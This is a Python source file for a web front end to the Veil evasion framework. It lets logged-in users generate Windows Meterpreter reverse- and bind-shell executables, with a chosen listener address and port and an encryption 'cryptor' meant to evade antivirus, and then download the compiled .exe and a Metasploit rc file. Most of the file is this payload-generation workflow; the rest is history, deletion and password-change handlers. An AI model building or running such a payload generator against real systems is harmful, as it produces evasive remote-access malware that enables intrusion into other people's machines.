# -*- coding: utf-8 -*-
'''
Created on Mar 13, 2012

@author: moloch

    Copyright 2012 Root the Box

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
'''

import re
import logging

from libs.SecurityDecorators import authenticated
from libs.ConfigManager import ConfigManager
from handlers.BaseHandlers import BaseHandler
from models import dbsession, User, Payload

# Veil imports
from modules.common import controller as veil_controller
from modules.common import messages
from modules.common import supportfiles
from config import veil


class CreatePayloadHandler(BaseHandler):

    reverse_protocols = ['tcp', 'tcp_rc4', 'tcp_allports', 'tcp_dns', 'http', 'https']
    bind_protocols = ['tcp', 'tcp_rc4', 'ipv6_tcp']
    cryptors = ['AESVirtualAlloc', 'ARCVirtualAlloc', 'DESVirtualAlloc', 
                'LetterSubVirtualAlloc', 'b64VirtualAlloc']


    @authenticated
    def get(self, *args, **kwargs):
        ''' Renders the about page '''
        if 0 < len(args):
            if args[0] == 'reverse':
                self.render_page("veil/create/reverse.html")
            elif args[0] == 'bind':
                self.render_page("veil/create/bind.html")
            else:
                self.redirect('/404')
        else:
            self.redirect('/404')

    @authenticated
    def post(self, *args, **kwargs):
        if 0 < len(args):
            if args[0] == 'reverse':
                self.create_reverse()
            elif args[0] == 'bind':
                self.create_bind()
            else:
                self.redirect('/404')
        else:
            self.redirect('/404')

    def create_reverse(self):
        ''' Validate arguments for reverse shell '''
        msfpayload = 'windows/meterpreter/reverse_'
        try:
            # LHOST
            ip = self.get_argument('lhost', None)
            lhost = self.validate_ip_address(ip)
            if lhost is None:
                raise ValueError('Invalid listener address')
            # LPORT
            port = self.get_argument('lport', None)
            lport = self.validate_port(port)
            # Protocol
            protocol = self.get_argument('protocol', None)
            if not protocol in self.reverse_protocols:
                raise ValueError("Invalid protocol")
            msfpayload += protocol
            # Cryptor
            cryptor = self.get_argument('cryptor', None)
            if not cryptor in self.cryptors:
                raise ValueError("Invalid cryptor")
            payload = self.create_payload(lport, msfpayload, 
                protocol, cryptor, lhost=lhost
            )
            self.generate("reverse_" + protocol, payload)
            self.redirect('/history?uuid=' + payload.uuid)
        except ValueError as error:
            errors = [str(error)]
            self.render_page('veil/create/reverse.html', errors)

    def create_bind(self):
        ''' Validate arguments for a bind shell '''
        msfpayload = 'windows/meterpreter/bind_'
        try:
            # RHOST
            ip = self.get_argument('rhost', None)
            rhost = self.validate_ip_address(ip)
            if rhost is None:
                raise ValueError('Invalid remote address')
            # LPORT
            port = self.get_argument('lport', None)
            lport = self.validate_port(port)
            # Protocol
            protocol = self.get_argument('protocol', None)
            if not protocol in self.bind_protocols:
                raise ValueError("Invalid protocol")
            msfpayload += protocol
            # Cryptor
            cryptor = self.get_argument('cryptor', None)
            if not cryptor in self.cryptors:
                raise ValueError("Invalid cryptor")
            # Create Payload
            payload = self.create_payload(lport, msfpayload, 
                protocol, cryptor, rhost=rhost
            )
            self.generate("bind_" + protocol, payload)
            self.redirect('/history?uuid=' + payload.uuid)
        except ValueError as error:
            errors = [str(error)]
            self.render_page('veil/create/bind.html', errors)

    def create_payload(self, lport, msfpayload, protocol, cryptor, 
                        lhost="0.0.0.0", rhost="0.0.0.0"):
        ''' Save new payload in database '''
        user = self.get_current_user()
        payload = Payload(
            user_id=user.id,
            lhost=lhost,
            rhost=rhost,
            lport=lport,
            msfpayload=msfpayload,
            protocol=protocol,
            cryptor=cryptor,
        )
        dbsession.add(payload)
        dbsession.flush()
        return payload

    def generate(self, name, payload, language='python'): 
        ''' Gerenate shell with args '''
        controller = veil_controller.Controller()
        options = {}
        options['msfvenom'] = [payload.msfpayload, payload.msfoptions]
        options['required_options'] = {'compile_to_exe': 'Y', 'use_pyherion': 'Y'}
        controller.SetPayload(language, payload.cryptor, options)
        file_name = name + "_veil"
        file_path = controller.OutputMenu(
            controller.payload, 
            controller.GeneratePayload(), 
            showTitle=False, 
            interactive=False, 
            OutputBaseChoice=file_name,
        )
        payload.file_path = file_path
        dbsession.add(payload)
        dbsession.flush()
    
    def render_page(self, html, errors=[]):
        self.render(html, 
            errors=errors, 
            bind_protocols=self.bind_protocols,
            reverse_protocols=self.reverse_protocols,
            cryptors=self.cryptors,
        )

    def validate_ip_address(self, ip):
        ''' 
        Validate an ip address, remove any unwanted chars 
        TODO: Add support for domain/host names, etc
        '''
        ip_address = filter(lambda char: char in '1234567890.', ip)
        ip_regex = re.compile(
            r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"
        )
        if 0 < len(ip_address):
            return ip_address if ip_regex.match(ip_address) else None
        else:
            return None

    def validate_port(self, port):
        ''' Validate we got a real port number '''
        try:
            return int(port) if 1 < int(port) < 65535 else 4444
        except:
            return 4444


class HistoryHandler(BaseHandler):

    @authenticated
    def get(self, *args, **kwargs):
        user = self.get_current_user()
        uuid = self.get_argument('uuid', None)
        if uuid is not None:
            payload = Payload.by_uuid(uuid)
            if payload is not None and payload in user.history:
                self.render('history/view_payload.html', payload=payload)
        else:
            self.render('history/view_table.html', 
                payloads=user.chronological_history
            )


class DownloadHandler(BaseHandler):

    @authenticated
    def get(self, *args, **kwargs):
        if 0 < len(args):
            if args[0] == 'exe':
                self.download_exe()
            elif args[0] == 'rc':
                self.download_rc()
            else:
                self.redirect('/404')
        else:
            self.redirect('/404')

    def download_exe(self):
        user = self.get_current_user()
        uuid = self.get_argument('uuid', '')
        payload = Payload.by_uuid(uuid)
        if payload is not None and payload in user.history:
            f = open(payload.file_path, 'r')
            data = f.read()
            self.set_header('Content-Type', 'application/x-msdos-program')
            self.set_header('Content-Length', len(data))
            self.set_header('Content-Disposition', 'attachment; filename=%s' %
                payload.file_name.replace('\n', '')  # Shouldn't be any
            )
            self.write(data)
            f.close()
            self.finish()
        else:
            self.render('public/404.html')

    def download_rc(self):
        user = self.get_current_user()
        uuid = self.get_argument('uuid', '')
        payload = Payload.by_uuid(uuid)
        if payload is not None and payload in user.history:
            data = payload.get_rc_file()
            self.set_header('Content-Type', 'text/plain')
            self.set_header('Content-Length', len(data))
            self.set_header('Content-Disposition', 'attachment; filename=%s' %
                payload.rc_file_name.replace('\n', '')  # Shouldn't be any
            )
            self.write(data)
            self.finish()
        else:
            self.render('public/404.html')

class DeletePayloadHandler(BaseHandler):

    @authenticated
    def post(self, *args, **kwargs):
        uuid = self.get_argument('uuid', '')
        payload = Payload.by_uuid(uuid)
        user = self.get_current_user()
        if payload is not None and payload in user.history:
            dbsession.delete(payload)
            dbsession.flush()
        self.redirect('/history')

class SettingsHandler(BaseHandler):

    @authenticated
    def get(self, *args, **kwargs):
        self.render('veil/settings.html', errors=[])

    @authenticated
    def post(self, *args, **kwargs):
        ''' Change user password '''
        user = self.get_current_user()
        old_password = self.get_argument('old_password', None)
        pass1 = self.get_argument('pass1', None)
        pass2 = self.get_argument('pass2', None)
        if old_password is None or pass1 is None or pass2 is None:
            self.render('veil/settings.html', 
                errors=['Fill in all the forms']
            )
        elif len(pass1) < 12 or len(pass2) < 12:
            self.render('veil/settings.html', 
                errors=['New password too short  (min. 12)']
            )
        elif pass1 != pass2:
            self.render('veil/settings.html',
                errors=['New passwords do not match']
            )
        elif user.validate_password(old_password):
            user.password = pass1
            dbsession.add(user)
            dbsession.flush()
            self.render('veil/settings.html', errors=[])
        else:
            self.render('veil/settings.html',
                errors=['Old password incorrect']
            )
